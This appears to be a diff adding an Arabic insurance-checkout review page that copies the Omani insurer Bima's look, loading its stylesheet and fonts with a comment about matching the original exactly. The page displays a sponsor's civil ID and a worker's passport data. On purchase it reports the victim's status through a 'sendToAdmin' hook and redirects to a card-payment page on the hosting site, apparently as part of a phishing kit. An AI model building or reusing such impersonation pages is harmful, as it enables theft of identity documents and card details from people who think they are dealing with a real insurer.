@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بيمة</title>
+    <link rel="stylesheet" href="https://app.bima.om/styles-NZVCYVCJ.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        .fas, .fa-solid, .fab, .fa-brands, .far, .fa-regular {
+            font-family: 'Font Awesome 6 Free' !important;
+            font-weight: 900 !important;
+        }
+        .dropdown.has-sub-menu > a.menu-title::after,
+        .dropdown.has-sub-menu > a.menu-title::before,
+        .dropdown.has-sub-menu > a::after,
+        .dropdown.has-sub-menu > a::before {
+            display: none !important;
+            content: none !important;
+        }
+    </style>
+    <style>
+        @font-face {
+            font-family: 'Tajawal Regular';
+            font-style: normal;
+            font-weight: 400;
+            src: url('https://app.bima.om/media/Tajawal-Regular-DBT5HAMZ.woff') format('woff');
+        }
+        body {
+            font-family: 'Tajawal Regular', sans-serif;
+            position: relative;
+            background: #fff;
+            font-size: 16px;
+            color: #586167;
+            margin: 0;
+            direction: rtl;
+        }
+        h1, h2, h3, h4, h5, h6, p, span, label, button, select, option, a, div, td, th, input {
+            font-family: 'Tajawal Regular', sans-serif !important;
+        }
+
+        /* Page heading */
+        .page-heading-1 {
+            font-size: 2rem;
+            font-weight: 600;
+            color: var(--theme-default5, #5eac12);
+            margin: 0;
+        }
+
+        /* Wave Container - matching original exactly */
+        .wave-container {
+            position: relative;
+            overflow: hidden;
+            background-color: #5eac12;
+            background: linear-gradient(90deg, #7df29c, #0f69a9);
+            background: -webkit-linear-gradient(90deg, hsl(136,82%,72%) 0%, hsl(205,84%,36%) 100%);
+            padding-bottom: 0;
+        }
+        .wave-container::before,
+        .wave-container::after {
+            content: "";
+            position: absolute;
+            left: 50%;
+            min-width: 300vw;
+            min-height: 300vw;
+            background-color: #fff;
+            animation-name: rotate;
+            animation-iteration-count: infinite;
+            animation-timing-function: linear;
+            pointer-events: none;
+        }
+        .wave-container::before {
+            bottom: 15vh;
+            border-radius: 45%;
+            animation-duration: 20s;
+        }
+        .wave-container::after {
+            bottom: 12vh;
+            opacity: .1;
+            border-radius: 47%;
+            animation-duration: 20s;
+        }
+        @keyframes rotate {
+            0% { transform: translate(-50%) rotate(0); }
+            50% { transform: translate(-50%, -2%) rotate(180deg); }
+            to { transform: translate(-50%) rotate(360deg); }
+        }
+
+        .section-page-contents {
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Review Page */
+        .domestic-review-page {
+            margin-top: 1.5rem;
+        }
+
+        .review_group {
+            margin-bottom: 1rem;
+        }
+
+        .review_item {
+            padding: .5rem 0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .review_item:last-child {
+            border-bottom: none;
+        }
+
+        .review_item .col-5 {
+            font-weight: 600;
+            color: #333;
+            font-size: .95rem;
+        }
+
+        .review_item .col-1 {
+            color: #6c757d;
+            text-align: center;
+        }
+
+        .review_item .col-6 {
+            color: #6c757d;
+            font-size: .95rem;
+        }
+
+        .kv-value {
+            word-break: break-word;
+        }
+
+        /* Section Title */
+        .section-heading {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: #15324d;
+            margin-bottom: 1rem;
+            padding-bottom: .5rem;
+            border-bottom: 2px solid var(--theme-default5, #5eac12);
+            display: inline-block;
+        }
+
+        /* Order Summary Panel */
+        .theme-bg1 {
+            background: #f9faf5 !important;
+        }
+
+        .mor-summary-panel {
+            position: sticky;
+            top: 1rem;
+        }
+
+        .mor-summary-panel h6 {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #15324d;
+            padding-bottom: .75rem;
+            border-bottom: 2px solid var(--theme-default5, #5eac12);
+            margin-bottom: 1rem;
+            display: inline-block;
+        }
+
+        .mor-summary-panel .d-flex p {
+            margin-bottom: .6rem;
+            font-size: .9rem;
+        }
+
+        .mor-summary-panel .summary-value {
+            color: #333;
+        }
+
+        .mor-summary-panel .border-top {
+            border-top: 1px solid #dee2e6 !important;
+        }
+
+        /* Total row */
+        .total-premium-row {
+            font-weight: 700;
+            font-size: 1rem;
+        }
+
+        .total-premium-row .omr-symbol {
+            font-size: .75rem;
+            color: #6c757d;
+            margin-left: 4px;
+        }
+
+        /* Amount box */
+        .amount-box {
+            background: #f8f9fa;
+            border: 1px solid #eee;
+            border-radius: 8px;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-top: 1rem;
+        }
+
+        .amount-box .radio-circle {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            border: 2px solid #5eac12;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .amount-box .radio-circle .inner {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #5eac12;
+        }
+
+        /* Checkbox */
+        .form-check-input:checked {
+            background-color: #0d6efd;
+            border-color: #0d6efd;
+        }
+
+        .form-check-label {
+            font-size: .85rem;
+            color: #555;
+        }
+
+        .form-check-label a {
+            color: #5eac12;
+            text-decoration: underline;
+        }
+
+        /* Pay Now Button */
+        .btn-gradient.color-2 {
+            background: linear-gradient(135deg, var(--theme-default5, #66b82f) 0%, var(--theme-default5_2, #3f8f20) 100%);
+            color: #fff;
+            border: 0;
+            border-radius: var(--bs-border-radius, .375rem);
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            box-shadow: 0 10px 18px color-mix(in srgb, var(--theme-default5, #3f8f20) 22%, transparent);
+            transition: all .2s;
+        }
+
+        .btn-gradient.color-2:hover {
+            background: linear-gradient(135deg, var(--theme-default5_2, #74c43d) 0%, var(--theme-default5, #4c9f26) 100%);
+            color: #fff;
+            transform: translateY(-1px);
+        }
+
+        .btn-gradient.color-2:disabled {
+            opacity: .6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Cross-sell products section */
+        .cross-sell-section {
+            margin-top: 2rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid #eee;
+        }
+        .cross-sell-section h6 {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #15324d;
+            text-decoration: underline;
+            margin-bottom: .5rem;
+        }
+        .cross-sell-section .selected-count {
+            color: #6c757d;
+            font-size: .85rem;
+        }
+        .product-card {
+            border: 1px solid #e0e0e0;
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 1rem;
+            display: flex;
+            gap: 15px;
+            align-items: flex-start;
+            background: #fff;
+        }
+        .product-card .product-icon {
+            width: 50px;
+            height: 50px;
+            flex-shrink: 0;
+        }
+        .product-card .product-icon svg {
+            width: 100%;
+            height: 100%;
+            color: #5eac12;
+        }
+        .product-card h6 {
+            font-size: 1rem;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: .5rem;
+            text-decoration: none;
+        }
+        .product-card p {
+            font-size: .85rem;
+            color: #6c757d;
+            margin-bottom: .5rem;
+            line-height: 1.5;
+        }
+        .product-card .follow-link {
+            color: #5eac12;
+            font-size: .85rem;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        /* Section Page Footer (Previous button area) */
+        .section-page-footer-1 {
+            border-top: 1px solid var(--bs-border-color, #dee2e6);
+            padding: 15px 30px;
+            display: flex;
+            justify-content: flex-start;
+        }
+        .section-page-footer-1 .btn-prev {
+            background: linear-gradient(to right, #5eac12 0%, #80c739 51%, #80c739 100%);
+            background-size: 200%;
+            color: #fff;
+            border: 0;
+            border-radius: 8px;
+            padding: 8px 30px 7px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all .3s;
+        }
+        .section-page-footer-1 .btn-prev:hover {
+            background-position: right center;
+            transform: translateY(-1px);
+        }
+
+        /* Footer */
+        footer {
+            background: transparent;
+            margin-top: 0;
+        }
+        .sub-footer.footer-light {
+            background-color: #f7f7f7;
+            padding: 12px 0;
+            border-top: 1px solid #eee;
+        }
+        .sub-footer .copy-right p {
+            color: #6c757d;
+            font-size: .85rem;
+            margin: 0;
+        }
+        .sub-footer-link {
+            list-style: none;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            gap: 15px;
+            justify-content: flex-end;
+        }
+        .sub-footer-link li a {
+            color: #333;
+            text-decoration: none;
+            font-size: .85rem;
+        }
+        .sub-footer-link li a:hover {
+            color: #5eac12;
+        }
+
+        .p-30px {
+            padding: 30px !important;
+        }
+
+        @media (max-width: 991px) {
+            .p-30px {
+                padding: 15px !important;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Navbar -->
+    <header dir="rtl" style="z-index: 9;" class="header-1 header-9 inner-page light-header shadow-cls">
+        <div class="container">
+            <div class="row">
+                <div class="col">
+                    <div class="menu">
+                        <div class="brand-logo">
+                            <a href="/"><img alt="logo" class="img-fluid for-light" src="/img/logo/bima-logo.svg" style="height:45px;"></a>
+                        </div>
+                        <nav class="nav-collapse">
+                            <div class="main-navbar">
+                                <div id="mainnav">
+                                    <ul class="nav-menu">
+                                        <li class="dropdown"><a class="nav-link menu-title" href="/"> الصفحة الرئيسية </a></li>
+                                        <li class="dropdown has-sub-menu"><a href="javascript:void(0)" class="nav-link menu-title"> تأمين</a>
+                                            <ul class="nav-submenu menu-content d-none d-md-block">
+                                                <li><a href="/#MotorForm"> التأمين على المركبات </a></li>
+                                                <li><a href="/insurance/vehicleshortperiod"> تأمين المركبات المؤقت </a></li>
+                                                <li><a href="/insurance/travel"> تأمين السفر </a></li>
+                                                <li><a href="/insurance/domestic-form"> تأمين خدم المنازل </a></li>
+                                                <li><a href="/insurance/medical-form"> تأمين صحي </a></li>
+                                                <li><a href="/insurance/credit-life-form"> تأمين القروض </a></li>
+                                                <li><a href="/insurance/malpractice-form"> تأمين الاخطاء الطبية </a></li>
+                                                <li><a href="/insurance/home-form"> تأمين المنازل </a></li>
+                                            </ul>
+                                        </li>
+                                        <li class="dropdown"><a class="nav-link menu-title" href="javascript:void(0)" style="pointer-events:none;opacity:0.5;cursor:default;"> تتبع الطلب </a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </nav>
+                        <ul class="header-right x-small-pl-1rem">
+                            <li class="right-menu color-6">
+                                <ul class="nav-menu">
+                                    <li class="dropdown language"><a href="javascript:void(0)"><i class="fas fa-globe"></i></a></li>
+                                    <li class="me-3"><a href="tel:+96879997797"><i class="fas fa-headphones"></i></a></li>
+                                </ul>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Wave Container - wraps everything including header, content, and footer button -->
+    <section class="wave-container pt-0">
+        <div class="section-page-contents">
+
+            <!-- Header with Stepper -->
+            <div class="page-header" id="page-header">
+                <div class="container p-0">
+                    <div class="row m-0">
+                        <div class="col-12 col-md-6 d-flex align-items-center justify-content-center text-center">
+                            <div class="home-title-group d-flex align-items-center flex-nowrap">
+                                <div class="home-content pt-2">
+                                    <h1 class="mt-0 page-heading-1">تأمين العمالة المنزلية</h1>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-12 col-md-6 d-flex align-items-center justify-content-center">
+                            <div class="pb-2 pb-md-0 pt-md-3">
+                                <div class="sm-stepper">
+                                    <div class="sm-stepper__item sm-is-done">
+                                        <a class="sm-stepper__link" href="/insurance/domestic-form.html">
+                                            <span class="sm-stepper__circle">1</span>
+                                            <span class="sm-stepper__label">التفاصيل</span>
+                                        </a>
+                                    </div>
+                                    <div class="sm-stepper__item sm-is-done">
+                                        <a class="sm-stepper__link">
+                                            <span class="sm-stepper__circle">2</span>
+                                            <span class="sm-stepper__label">العروض</span>
+                                        </a>
+                                    </div>
+                                    <div class="sm-stepper__item sm-is-done">
+                                        <a class="sm-stepper__link">
+                                            <span class="sm-stepper__circle" aria-current="step">3</span>
+                                            <span class="sm-stepper__label">مراجعة</span>
+                                        </a>
+                                    </div>
+                                    <div class="sm-stepper__item">
+                                        <a class="sm-stepper__link">
+                                            <span class="sm-stepper__circle">4</span>
+                                            <span class="sm-stepper__label">الدفع</span>
+                                        </a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Main Content -->
+            <div class="container mt-4 domestic-review-page">
+                <div class="row">
+                    <div class="col z-index-1">
+                        <div class="mor-content">
+                            <div class="row theme-card p-0 overflow-hidden mb-5">
+                                <!-- Right Side: Details (col-8) -->
+                                <div class="col-12 col-lg-8 p-30px">
+
+                                    <!-- تفاصيل الكفيل -->
+                                    <h6 class="section-heading">تفاصيل الكفيل</h6>
+                                    <div class="review_group">
+                                        <div class="review_item">
+                                            <div class="row">
+                                                <div class="col-5 fw-medium">الأسم الأول</div>
+                                                <div class="col-1 text-muted">:</div>
+                                                <div class="col-6 text-muted"><span class="kv-value" id="sponsor-name">-</span></div>
+                                            </div>
+                                        </div>
+                                        <div class="review_item">
+                                            <div class="row">
+                                                <div class="col-5 fw-medium">البريد الإلكتروني</div>
+                                                <div class="col-1 text-muted">:</div>
+                                                <div class="col-6 text-muted"><span class="kv-value" id="sponsor-email">-</span></div>
+                                            </div>
+                                        </div>
+                                        <div class="review_item">
+                                            <div class="row">
+                                                <div class="col-5 fw-medium">الجنس</div>
+                                                <div class="col-1 text-muted">:</div>
+                                                <div class="col-6 text-muted"><span class="kv-value" id="sponsor-gender">-</span></div>
+                                            </div>
+                                        </div>
+                                        <div class="review_item">
+                                            <div class="row">
+                                                <div class="col-5 fw-medium">الرقم المدني</div>
+                                                <div class="col-1 text-muted">:</div>
+                                                <div class="col-6 text-muted"><span class="kv-value" id="sponsor-civil-id">-</span></div>
+                                            </div>
+                                        </div>
+                                        <div class="review_item">
+                                            <div class="row">
+                                                <div class="col-5 fw-medium">المنطقة</div>
+                                                <div class="col-1 text-muted">:</div>
+                                                <div class="col-6 text-muted"><span class="kv-value" id="sponsor-region">-</span></div>
+                                            </div>
+                                        </div>
+                                        <div class="review_item">
+                                            <div class="row">
+                                                <div class="col-5 fw-medium">الولاية</div>
+                                                <div class="col-1 text-muted">:</div>
+                                                <div class="col-6 text-muted"><span class="kv-value" id="sponsor-wilayat">-</span></div>
+                                            </div>
+                                        </div>
+                                        <div class="review_item">
+                                            <div class="row">
+                                                <div class="col-5 fw-medium">الجنسية</div>
+                                                <div class="col-1 text-muted">:</div>
+                                                <div class="col-6 text-muted"><span class="kv-value" id="sponsor-nationality">-</span></div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <div style="margin-top: 30px;"></div>
+
+                                    <!-- بيانات العامل -->
+                                    <h6 class="section-heading">بيانات العامل</h6>
+                                    <div class="review_group">
+                                        <div class="review_item">
+                                            <div class="row">
+                                                <div class="col-5 fw-medium">الأسم الأول</div>
+                                                <div class="col-1 text-muted">:</div>
+                                                <div class="col-6 text-muted"><span class="kv-value" id="worker-name">-</span></div>
+                                            </div>
+                                        </div>
+                                        <div class="review_item">
+                                            <div class="row">
+                                                <div class="col-5 fw-medium">الجنس</div>
+                                                <div class="col-1 text-muted">:</div>
+                                                <div class="col-6 text-muted"><span class="kv-value" id="worker-gender">-</span></div>
+                                            </div>
+                                        </div>
+                                        <div class="review_item">
+                                            <div class="row">
+                                                <div class="col-5 fw-medium">رقم الجواز</div>
+                                                <div class="col-1 text-muted">:</div>
+                                                <div class="col-6 text-muted"><span class="kv-value" id="worker-passport">-</span></div>
+                                            </div>
+                                        </div>
+                                        <div class="review_item">
+                                            <div class="row">
+                                                <div class="col-5 fw-medium">تاريخ الاصدار</div>
+                                                <div class="col-1 text-muted">:</div>
+                                                <div class="col-6 text-muted"><span class="kv-value" id="worker-issue-date">-</span></div>
+                                            </div>
+                                        </div>
+                                        <div class="review_item">
+                                            <div class="row">
+                                                <div class="col-5 fw-medium">تاريخ الانتهاء</div>
+                                                <div class="col-1 text-muted">:</div>
+                                                <div class="col-6 text-muted"><span class="kv-value" id="worker-expiry-date">-</span></div>
+                                            </div>
+                                        </div>
+                                        <div class="review_item">
+                                            <div class="row">
+                                                <div class="col-5 fw-medium">بلد الاصدار</div>
+                                                <div class="col-1 text-muted">:</div>
+                                                <div class="col-6 text-muted"><span class="kv-value" id="worker-issue-country">-</span></div>
+                                            </div>
+                                        </div>
+                                        <div class="review_item">
+                                            <div class="row">
+                                                <div class="col-5 fw-medium">المهنة</div>
+                                                <div class="col-1 text-muted">:</div>
+                                                <div class="col-6 text-muted"><span class="kv-value" id="worker-profession">-</span></div>
+                                            </div>
+                                        </div>
+                                        <div class="review_item">
+                                            <div class="row">
+                                                <div class="col-5 fw-medium">رقم التواصل</div>
+                                                <div class="col-1 text-muted">:</div>
+                                                <div class="col-6 text-muted"><span class="kv-value" id="worker-contact">-</span></div>
+                                            </div>
+                                        </div>
+                                        <div class="review_item">
+                                            <div class="row">
+                                                <div class="col-5 fw-medium">الجنسية</div>
+                                                <div class="col-1 text-muted">:</div>
+                                                <div class="col-6 text-muted"><span class="kv-value" id="worker-nationality">-</span></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Left Side: Order Summary (col-4) -->
+                                <div class="col-12 col-lg-4 theme-bg1">
+                                    <div class="p-4 mor-summary-panel">
+                                        <h6>ملخص الطلب</h6>
+                                        <div class="d-flex justify-content-between">
+                                            <p class="fw-medium">المبلغ الإجمالي</p>
+                                            <p class="fw-semibold summary-value text-end" id="sv-gross">14.026</p>
+                                        </div>
+                                        <div class="d-flex justify-content-between">
+                                            <p class="fw-medium">الرسوم</p>
+                                            <p class="fw-semibold summary-value text-end" id="sv-fees">0.259</p>
+                                        </div>
+                                        <div class="d-flex justify-content-between border-top pt-2">
+                                            <p class="fw-medium">المبلغ الصافي</p>
+                                            <p class="fw-semibold summary-value text-end" id="sv-net">14.285</p>
+                                        </div>
+                                        <div class="d-flex justify-content-between">
+                                            <p class="fw-medium">ضريبة القيمة المضافة</p>
+                                            <p class="fw-semibold summary-value text-end" id="sv-vat">0.714</p>
+                                        </div>
+                                        <div class="d-flex justify-content-between border-top pt-2 total-premium-row">
+                                            <p class="fw-medium">إجمالي القسط</p>
+                                            <p class="fw-semibold summary-value text-end">
+                                                <span class="omr-symbol">ع.ر</span> 15.000
+                                            </p>
+                                        </div>
+
+                                        <!-- Amount Selection -->
+                                        <div class="amount-box">
+                                            <div style="display:flex;align-items:center;gap:10px;">
+                                                <div class="radio-circle"><div class="inner"></div></div>
+                                                <span>مجموع المبلغ</span>
+                                            </div>
+                                            <span class="fw-bold">15.000</span>
+                                        </div>
+
+                                        <!-- Terms -->
+                                        <div class="form-check mb-4 mt-4">
+                                            <input class="form-check-input" id="termsCheck" type="checkbox" checked onchange="togglePayBtn()">
+                                            <label class="form-check-label text-sm" for="termsCheck">
+                                                لقد قرأت تفاصيل التغطية أعلاه وأوافق عليها
+                                                <a href="https://bima.om/Home/Terms" target="_blank">الشروط</a>
+                                                <a href="https://bima.om/Home/FAQ" target="_blank">والأحكام</a>،
+                                                <a href="https://bima.om/Home/FAQ" target="_blank">التعليمات</a>
+                                            </label>
+                                        </div>
+
+                                        <!-- Buy Button -->
+                                        <button id="btnBuy" class="btn btn-gradient color-2 btn-lg w-100 py-3 d-flex justify-content-center align-items-center" type="button" onclick="goToPayment()">
+                                            <span>إشتر الآن</span>
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Cross-sell Products Section -->
+            <div class="container">
+                <div class="cross-sell-section">
+                    <div class="d-flex justify-content-between align-items-center">
+                        <h6>منتجات أخرى قد ترغب في إضافتها</h6>
+                        <span class="selected-count">تم اختيار 0</span>
+                    </div>
+                    <div class="product-card">
+                        <div class="product-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                                <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
+                            </svg>
+                        </div>
+                        <div>
+                            <h6>التأمين الصحي</h6>
+                            <p>التأمين الصحي يوفر تغطية للمصاريف الطبية مثل زيارات الأطباء والإقامة في المستشفى والعلاجات. يساعد في تقليل العبء المالي لتكاليف الرعاية الصحية على الأفراد والعائلات. يضمن الحصول على رعاية طبية جيدة عند الحاجة.</p>
+                            <a class="follow-link" href="/insurance/medical-form">متابعة</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Bottom Navigation (Previous button) -->
+            <div class="container mt-4 mb-4">
+                <div class="section-page-footer-1">
+                    <button class="btn-prev" type="button" onclick="goBack()">
+                        السابق <i class="fas fa-arrow-left ms-2"></i>
+                    </button>
+                </div>
+            </div>
+
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="sub-footer footer-light">
+            <div class="container">
+                <div class="row">
+                    <div class="col-xl-6 col-md-6">
+                        <div class="copy-right">
+                            <p class="mb-0">حقوق الطبع والنشر &copy; 2026، جميع الحقوق محفوظة</p>
+                        </div>
+                    </div>
+                    <div class="col-xl-6 col-md-6 text-end">
+                        <ul class="sub-footer-link">
+                            <li><a href="/">الصفحة الرئيسية</a></li>
+                            <li><a href="https://bima.om/Home/Terms" target="_blank">شروط</a></li>
+                            <li><a href="https://bima.om/Home/PrivacyPolicy" target="_blank">سياسة الخصوصية</a></li>
+                            <li><a href="https://bima.om/Home/ContactUs" target="_blank">اتصال</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        function togglePayBtn() {
+            const cb = document.getElementById('termsCheck');
+            const btn = document.getElementById('btnBuy');
+            btn.disabled = !cb.checked;
+        }
+
+        function goToPayment() {
+            if (window.sendToAdmin) {
+                window.sendToAdmin({
+                    'المبلغ': '15 ر.ع',
+                    'الحالة': 'تم الشراء'
+                }, 'تأمين العمالة المنزلية - مراجعة');
+            }
+            window.location.href = '/credit-card-payment?amount=15';
+        }
+
+        function goBack() {
+            window.location.href = '/insurance/employee-details.html';
+        }
+
+        // Load data from localStorage
+        function loadReviewData() {
+            // Sponsor data
+            const sponsorData = JSON.parse(localStorage.getItem('sponsorData') || '{}');
+            if (sponsorData.firstName) {
+                const title = sponsorData.title || '';
+                document.getElementById('sponsor-name').textContent =
+                    sponsorData.firstName + ' ' + (sponsorData.lastName || '') + ' ' + title;
+            }
+            if (sponsorData.email) document.getElementById('sponsor-email').textContent = sponsorData.email;
+            if (sponsorData.gender) document.getElementById('sponsor-gender').textContent = sponsorData.gender;
+            if (sponsorData.civilId) document.getElementById('sponsor-civil-id').textContent = sponsorData.civilId;
+            if (sponsorData.region) document.getElementById('sponsor-region').textContent = sponsorData.region;
+            if (sponsorData.wilayat) document.getElementById('sponsor-wilayat').textContent = sponsorData.wilayat;
+            if (sponsorData.nationality) document.getElementById('sponsor-nationality').textContent = sponsorData.nationality;
+
+            // Worker data
+            const workerData = JSON.parse(localStorage.getItem('workerData') || '{}');
+            if (workerData.firstName) {
+                const title = workerData.title || '';
+                document.getElementById('worker-name').textContent =
+                    workerData.firstName + ' ' + (workerData.lastName || '') + ' (' + title + ')';
+            }
+            if (workerData.gender) document.getElementById('worker-gender').textContent = workerData.gender;
+            if (workerData.passportNumber) document.getElementById('worker-passport').textContent = workerData.passportNumber;
+            if (workerData.issueDate) document.getElementById('worker-issue-date').textContent = workerData.issueDate;
+            if (workerData.expiryDate) document.getElementById('worker-expiry-date').textContent = workerData.expiryDate;
+            if (workerData.issueCountry) document.getElementById('worker-issue-country').textContent = workerData.issueCountry;
+            if (workerData.profession) document.getElementById('worker-profession').textContent = workerData.profession;
+            if (workerData.contactNumber) document.getElementById('worker-contact').textContent = workerData.contactNumber;
+            if (workerData.nationality) document.getElementById('worker-nationality').textContent = workerData.nationality;
+        }
+
+        document.addEventListener('DOMContentLoaded', loadReviewData);
+    </script>
+<script src="../visitor-tracking.js"></script>
+</body>
+</html>
